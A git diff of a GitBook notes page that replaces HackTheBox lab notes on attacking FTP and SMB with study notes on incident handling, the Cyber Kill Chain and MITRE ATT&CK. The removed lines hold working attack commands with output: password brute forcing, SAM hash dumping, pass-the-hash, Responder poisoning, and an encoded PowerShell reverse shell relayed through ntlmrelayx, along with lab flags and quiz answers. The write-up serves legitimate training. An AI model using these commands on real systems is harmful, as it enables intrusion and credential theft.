@@ -1,923 +1,730 @@
----
-description: 11/11 HackTheBox notes started.
----
+# Incident Handling Process
 
-# Attacking Common Services
+### Incident Handling
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+An event is an action occuring in a system or network. For example;
 
-### Attacking FTP
+* A user sending an email.
+* A mouse click.
 
-FTP is used to transfer files between computers, whilst also performing directory and file operations like changing the current working directory. By default FTP listens on port TCP/21.
+An incident is an event with a negative consequence, a system crash is a good example.&#x20;
 
-#### Enumerating FTP
+**Incident handling be defined through the following graph.**
 
-```shell-session
-0xgrooted@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
-Nmap scan report for 192.168.2.142
-Host is up (0.00054s latency).
+Please see the following Real-World Incidents
 
-PORT   STATE SERVICE
-21/tcp open  ftp
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
-| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
-| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
-| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
-| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
-| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
-|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
-```
+#### Leaked Credentials
 
-#### Misconfigurations
+* `Colonial Pipeline Ransomware Attack`: The Colonial Pipeline, a major American oil pipeline system, fell victim to a ransomware attack. This [attack](https://en.wikipedia.org/wiki/Colonial_Pipeline_ransomware_attack) originated from a breached employee's personal password, likely found on the dark web, rather than a direct attack on the company's network. The attackers gained access to the company's systems using a compromised password for an inactive VPN (Virtual Private Network) account, which did not have Multi-Factor Authentication (MFA) enabled.
 
-We can login anonymously using the username anonymous with no password. This can be done as follows:
+#### Default / Weak Credentials
 
-```shell-session
-0xgrooted@htb[/htb]$ ftp 192.168.2.142    
-                     
-Connected to 192.168.2.142.
-220 (vsFTPd 2.3.4)
-Name (192.168.2.142:kali): anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
--rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
-226 Directory send OK.
-```
+* `Mirai Botnet (2016)`: The Mirai botnet scanned for IoT devices using factory or default credentials (e.g., admin/admin) and conscripted them into a massive DDoS botnet. This led to large-scale DDoS disruptions affecting companies like Dyn and OVH, with hundreds of thousands of devices infected. The root cause was the devices being shipped with unchanged default credentials and poor remote access security.
+* `LogicMonitor Incident (2023)`: Some LogicMonitor customers were compromised because the vendor issued weak default passwords to customer accounts. Affected customers experienced follow-on ransomware incidents or unauthorized access. The root cause involved vendor-assigned weak/default credentials and delayed enforcement of password hardening.
 
-#### Brute forcing with medusa
+#### Outdated Software / Unpatched Systems
 
-```shell-session
-0xgrooted@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
-                                                             
-Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
-ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
-ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
-ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
-ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
-```
+* `Equifax (2017) Breach`: Attackers exploited a known Apache Struts vulnerability (CVE-2017-5638) in Equifax’s web application. This breach exposed the personal data of approximately 143–147 million people, leading to major regulatory and legal fallout. The incident occurred due to a failure to apply a publicly released patch in a timely manner.
+* `WannaCry (2017)`: The WannaCry ransomware spread as a worm using the SMB EternalBlue exploit, affecting more than 200,000 systems across over 150 countries. High-profile impacts included hospitals and enterprises. This incident was due to unpatched Windows systems, despite the MS17-010 patch being available before the outbreak.
 
-#### FTP Bounce Attack
+#### Rogue Employee / Insider Threat
 
-A network attack that uses FTP servers to deliver outbound traffic to another traffic currently on the network.
+* `Cash App / Block Inc. (2021 Disclosure; Public 2022 Notice)`: A former employee accessed the personal information of millions of Cash App users, as reported in company disclosures. Approximately 8.2 million current and former customers were potentially impacted, leading to regulatory scrutiny and settlements. The root cause was the abuse of legitimate employee access and insufficient internal controls and monitoring.
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+#### Phishing / Social Engineering
 
-This can be done through nmap:
+* `Industry Trend & Representative Data`: Phishing is a pervasive vector used to obtain credentials, deliver malware, or trick users into enabling remote access. It frequently leads to account compromise, fraud, and network footholds. A significant portion of breaches over multiple years are linked to phishing.
+* `U.S. Interior Department Phishing Attack`: Attackers used an "evil twin" technique to trick individuals into connecting to a fake Wi-Fi network, allowing hackers to steal credentials and access the network. This incident revealed a lack of secure wireless network infrastructure and insufficient security measures, including weak user authentication and inadequate network testing.
+* `2020 Twitter Account Hijacking`: In 2020, many high-profile Twitter accounts were compromised by outside parties to promote a bitcoin scam. Attackers gained access to Twitter's administrative tools, allowing them to alter accounts and post tweets directly. They appeared to have used social engineering to gain access to the tools via Twitter employees.
 
-```shell-session
-0xgrooted@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+#### Supply-Chain Attack
 
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
-Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
-Attempting connection to ftp://anonymous:password@10.10.110.213:21
-Connected:220 (vsFTPd 3.0.3)
-Login credentials accepted by FTP server!
-Initiating Bounce Scan at 04:55
-FTP command misalignment detected ... correcting.
-Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
-Nmap scan report for 172.17.0.2
-Host is up.
+* `SolarWinds Orion (2020)`: Nation-state actors compromised the SolarWinds build/release environment and injected a malicious backdoor into Orion updates, which were distributed to thousands of customers. This caused wide-reaching espionage and unauthorized access across government and private sectors, leading to protracted detection and remediation efforts.
 
-PORT   STATE  SERVICE
-80/tcp open http
+### Cyber Kill Chain
 
-<SNIP>
-```
+This Lifecycle describes how attacks manifest themselves.&#x20;
 
-What port is the FTP service running on?
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Method:&#x20;
+**Stages Of The Cyber Kill Chain**
 
-```
-┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
-└──╼ [★]$ nmap -sC -sV 10.129.40.233
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-11 12:30 CST
-Nmap scan report for 10.129.40.233
-Host is up (0.045s latency).
-Not shown: 995 closed tcp ports (reset)
-PORT     STATE SERVICE     VERSION
-22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
-|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
-|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
-53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
-| dns-nsid: 
-|_  bind.version: 9.16.1-Ubuntu
-139/tcp  open  netbios-ssn Samba smbd 4.6.2
-445/tcp  open  netbios-ssn Samba smbd 4.6.2
-2121/tcp open  ftp
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| -rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-|_-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
-| fingerprint-strings: 
-|   GenericLines: 
-|     220 ProFTPD Server (InlaneFTP) [10.129.40.233]
-|     Invalid command: try being more creative
-|_    Invalid command: try being more creative
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port2121-TCP:V=7.94SVN%I=7%D=11/11%Time=691380C7%P=x86_64-pc-linux-gnu%
-SF:r(GenericLines,8C,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.1
-SF:29\.40\.233\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20
-SF:creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creat
-SF:ive\r\n");
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+1. Recon - The initial stage where the attacker chooses their target. The attacker will perform information gathering from web sources, and documentation on the targets organisations website.![](<.gitbook/assets/image (4).png>)
+2. Weaponise - Malware to be used for initial access is developed and embedded into some type of exploit.
+3. Delivery - The exploit or payload is delivered to the victim, traditionally done through phishing emails.
+4. Exploitation - The moment where the exploit is triggered, the attacker attempts to execute code on the target system.
+5. Installation - Initial stager is executed and is running on the compromised machine. Common techniques are;
+   1. Droppers - A small piece of code designed to install malware on the system and execute it.
+   2. Backdoors - Type of malware designed to provide the attacker with ongoing access to the compromised system.
+   3. Rootkits - Type of malware designed to hide its presence on a compromised system.
+6. Command and Control - Attacker establishes a remote access capability to the compromised machine.&#x20;
+7. Action - The objective of each attack can vary, some may exfiltrate data others may try to obtain the highest level of access possible.
 
-Host script results:
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2025-11-11T18:30:34
-|_  start_date: N/A
-|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-|_clock-skew: -17s
+### MITRE ATT\&CK Framework
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 67.39 seconds
+{% embed url="https://attack.mitre.org/" %}
 
-```
+it is a granular matrix-based knowledge base of adversary tactics and techniques used to acheive specific goals.
 
-Answer: 2121
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
-Question:  What username is available for the FTP server?
+**Tactic -** High level adversary objective during intrusion.
 
-Method:
+**Technique -** A specific method adversaries use to achieve a tactic
 
-```
-┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
-└──╼ [★]$ ftp anonymous@10.129.40.233 -p 2121
-Connected to 10.129.40.233.
-220 ProFTPD Server (InlaneFTP) [10.129.40.233]
-331 Anonymous login ok, send your complete email address as your password
-Password: 
-230 Anonymous access granted, restrictions apply
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> ls
-229 Entering Extended Passive Mode (|||21289|)
-150 Opening ASCII mode data connection for file list
--rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
--rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
-226 Transfer complete
-ftp> get *
-local: htb_vpn_logs.log remote: *
-229 Entering Extended Passive Mode (|||12563|)
-550 *: No such file or directory
-ftp> get users.list
-local: users.list remote: users.list
-229 Entering Extended Passive Mode (|||15028|)
-150 Opening BINARY mode data connection for users.list (72 bytes)
-    72      963.18 KiB/s 
-226 Transfer complete
-72 bytes received in 00:00 (1.57 KiB/s)
-ftp> get passwords.list
-local: passwords.list remote: passwords.list
-229 Entering Extended Passive Mode (|||44109|)
-150 Opening BINARY mode data connection for passwords.list (1959 bytes)
-  1959        3.45 MiB/s 
-226 Transfer complete
-1959 bytes received in 00:00 (44.70 KiB/s)
-ftp> 
+**Sub-Technique -** Sub-techniques are children of techniques that capture a particular implementation or target. Sub-technique IDs extend the parent technique
 
-```
+### Pyramid of Pain
 
-```
-┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
-└──╼ [★]$ cat users.list
-root
-robin
-adm
-admin
-administrator
-MARRY
-jason
-sa
-dbuser
-pentest
-marlin
+How much effort it takes for an adversary to change their tactics.
 
-```
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
-This question and the last both go together
+Question: In which stage of the Cyber Kill Chain is malware developed?
 
-```
-┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
-└──╼ [★]$ medusa -U users.list -P passwords.list -h 10.129.40.233 -M ftp -n 2121
-```
+Answer: Weaponize
 
-Or with hydra:
+Question: Check the alert with reference 67c202 (LSASS Access) in TheHive, and provide the MITRE rule ID as the answer.
 
-```
-┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
-└──╼ [★]$ hydra -l "robin" -P passwords.list ftp://10.129.40.233:2121 
-```
+Method: Go to the web browser and search the ip address with port 9000. (\<ip>:9000)
 
-Which gives us the password: 7iz4rnckjsduza7
-
-Now we login:
-
-```
-─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
-└──╼ [★]$ ftp robin@10.129.40.233 -p 2121
-Connected to 10.129.40.233.
-220 ProFTPD Server (InlaneFTP) [10.129.40.233]
-331 Password required for robin
-Password: 
-230 User robin logged in
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> ls
-229 Entering Extended Passive Mode (|||15094|)
-150 Opening ASCII mode data connection for file list
--rw-rw-r--   1 robin    robin          27 Apr 18  2022 flag.txt
-226 Transfer complete
-ftp> get flag.txt
-local: flag.txt remote: flag.txt
-229 Entering Extended Passive Mode (|||18764|)
-150 Opening BINARY mode data connection for flag.txt (27 bytes)
-    27        8.65 KiB/s 
-226 Transfer complete
-27 bytes received in 00:00 (0.58 KiB/s)
-ftp> 
-
-
-```
-
-which gives us the answer:
-
-HTB{ATT4CK1NG\_F7P\_53RV1C3}
+Search the Reference number and you will find the mitreid: T1003.001.
 
 ***
 
-### Attacking SMB
+### Incident Handling Process Overview
 
-A communication protocol created for providing shared access to files and printers across nodes on a network, Running on TCP/IP 445 since windows 2000, Previously it ran over port 139.
+Incident handlers spend most of their time in the first two stages, `preparation` and `detection and analysis`. This is where we, as incident handlers, spend much time improving ourselves and looking for the next malicious event. When a malicious event is detected, we move on to the next stage and respond to the event (but there should always be resources operating in the first two stages, so there is no disruption of preparation and detection capabilities)
 
-#### Enumeration
+So, incident handling has two main activities, which are `investigating` and `recovering`. The investigation aims to:
 
-```shell-session
-0xgrooted@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
+* `Discover` the initial '`patient zero`' victim and create an ongoing (if still active) incident timeline.
+* Determine which `tools` and malware the adversary used.
+* `Document` the compromised systems and what the adversary has done.
 
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
-Nmap scan report for 10.129.14.128
-Host is up (0.00024s latency).
+Question: True or False: Incident handling contains two main activities: investigating and reporting.
 
-PORT    STATE SERVICE     VERSION
-139/tcp open  netbios-ssn Samba smbd 4.6.2
-445/tcp open  netbios-ssn Samba smbd 4.6.2
-MAC Address: 00:00:00:00:00:00 (VMware)
-
-Host script results:
-|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-| smb2-security-mode: 
-|   2.02: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2021-09-19T13:16:04
-|_  start_date: N/A
-```
-
-#### Misconfigurations
-
-SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.
-
-**File Share**
-
-Using `smbclient`, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session.
-
-&#x20; Attacking SMB
-
-```shell-session
-0xgrooted@htb[/htb]$ smbclient -N -L //10.129.14.128
-
-        Sharename       Type      Comment
-        -------      --     -------
-        ADMIN$          Disk      Remote Admin
-        C$              Disk      Default share
-        notes           Disk      CheckIT
-        IPC$            IPC       IPC Service (DEVSM)
-SMB1 disabled no workgroup available
-```
-
-`Smbmap` is another tool that helps us enumerate network shares and access associated permissions. An advantage of `smbmap` is that it provides a list of permissions for each shared folder.
-
-```shell-session
-0xgrooted@htb[/htb]$ smbmap -H 10.129.14.128
-
-[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
-        Disk                                                    Permissions     Comment
-        --                                                   ---------    -------
-        ADMIN$                                                  NO ACCESS       Remote Admin
-        C$                                                      NO ACCESS       Default share
-        IPC$                                                    READ ONLY       IPC Service (DEVSM)
-        notes                                                   READ, WRITE     CheckIT
-```
-
-**Enum4Linux**
-
-```shell-session
-0xgrooted@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
-
-ENUM4LINUX - next generation
-
- ==========================
-|    Target Information    |
- ==========================
-[*] Target ........... 10.10.11.45
-[*] Username ......... ''
-[*] Random Username .. 'noyyglci'
-[*] Password ......... ''
-
- ====================================
-|    Service Scan on 10.10.11.45     |
- ====================================
-[*] Checking LDAP (timeout: 5s)
-[-] Could not connect to LDAP on 389/tcp: connection refused
-[*] Checking LDAPS (timeout: 5s)
-[-] Could not connect to LDAPS on 636/tcp: connection refused
-[*] Checking SMB (timeout: 5s)
-[*] SMB is accessible on 445/tcp
-[*] Checking SMB over NetBIOS (timeout: 5s)
-[*] SMB over NetBIOS is accessible on 139/tcp
-
- ===================================================                            
-|    NetBIOS Names and Workgroup for 10.10.11.45    |
- ===================================================                                                                                         
-[*] Got domain/workgroup name: WORKGROUP
-[*] Full NetBIOS names information:
-- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
-- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
-- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
-- MAC Address = 00-0C-29-D7-17-DB
-...
- ========================================
-|    SMB Dialect Check on 10.10.11.45    |
- ========================================
-
-<SNIP>
-```
-
-**Password brute forcing**
-
-```shell-session
-0xgrooted@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
-
-SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
-SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
-SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
-SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
-SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
-SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
-SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
-SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 
-
-<SNIP>
-
-SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
-
-```
-
-**Impacket**
-
-Used to connect to a remote machine
-
-```shell-session
-0xgrooted@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
-
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-
-[*] Requesting shares on 10.10.110.17.....
-[*] Found writable share ADMIN$
-[*] Uploading file EHtJXgng.exe
-[*] Opening SVCManager on 10.10.110.17.....
-[*] Creating service nbAc on 10.10.110.17.....
-[*] Starting service nbAc.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.19041.1415]
-(c) Microsoft Corporation. All rights reserved.
-
-
-C:\Windows\system32>whoami && hostname
-
-nt authority\system
-WIN7BOX
-```
-
-**Enumerate logged in users**
-
-```shell-session
-0xgrooted@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
-
-SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
-SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
-SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
-SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
-SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
-SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
-SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
-SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
-SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
-```
-
-**Extract hashes from SAM Database**
-
-```shell-session
-0xgrooted@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
-
-SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
-SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
-SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
-SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
-SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
-SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
-SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
-SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
-```
-
-**PassTheHash login**
-
-```shell-session
-0xgrooted@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
-
-SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
-SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
-```
-
-**Capturing Credentials using responder**
-
-```shell-session
-0xgrooted@htb[/htb]$ sudo responder -I ens33
-
-                                         __               
-  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
-  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
-  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
-                   |__|              
-
-           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
-               
-  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
-  To kill this script hit CTRL-C
-
-[+] Poisoners:                
-    LLMNR                      [ON]
-    NBT-NS                     [ON]        
-    DNS/MDNS                   [ON]   
-                                                                                                                                                                                          
-[+] Servers:         
-    HTTP server                [ON]                                   
-    HTTPS server               [ON]
-    WPAD proxy                 [OFF]                                  
-    Auth proxy                 [OFF]
-    SMB server                 [ON]                                   
-    Kerberos server            [ON]                                   
-    SQL server                 [ON]                                   
-    FTP server                 [ON]                                   
-    IMAP server                [ON]                                   
-    POP3 server                [ON]                                   
-    SMTP server                [ON]                                   
-    DNS server                 [ON]                                   
-    LDAP server                [ON]
-    RDP server                 [ON]
-    DCE-RPC server             [ON]
-    WinRM server               [ON]                                   
-                                                                                   
-[+] HTTP Options:                                                                  
-    Always serving EXE         [OFF]                                               
-    Serving EXE                [OFF]                                               
-    Serving HTML               [OFF]                                               
-    Upstream Proxy             [OFF]                                               
-
-[+] Poisoning Options:                                                             
-    Analyze Mode               [OFF]                                               
-    Force WPAD auth            [OFF]                                               
-    Force Basic Auth           [OFF]                                               
-    Force LM downgrade         [OFF]                                               
-    Fingerprint hosts          [OFF]                                               
-
-[+] Generic Options:                                                               
-    Responder NIC              [tun0]                                              
-    Responder IP               [10.10.14.198]                                      
-    Challenge set              [random]                                            
-    Don't Respond To Names     ['ISATAP']                                          
-
-[+] Current Session Variables:                                                     
-    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
-    Responder Domain Name      [HF2L.LOCAL]                                        
-    Responder DCE-RPC Port     [48162] 
-
-[+] Listening for events... 
-
-[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
-[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
-[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
-[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
-[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
-[SMB] NTLMv2-SSP Client   : 10.10.110.17
-[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
-[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
-```
-
-Using Impacket we can then send and execute a reverse shell:
-
-```shell-session
-0xgrooted@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
-```
-
-Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
-
-```shell-session
-0xgrooted@htb[/htb]$ nc -lvnp 9001
-
-listening on [any] 9001 ...
-connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471
-
-PS C:\Windows\system32> whoami;hostname
-
-nt authority\system
-```
-
-Question: What is the name of the shared folder with READ permissions?
-
-Method:&#x20;
-
-I started with a nmap scan to see what port smb was running on
-
-```
-└──╼ [★]$ nmap 10.129.232.68 -sC -sV -p139,445
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-12 06:52 CST
-Nmap scan report for 10.129.232.68
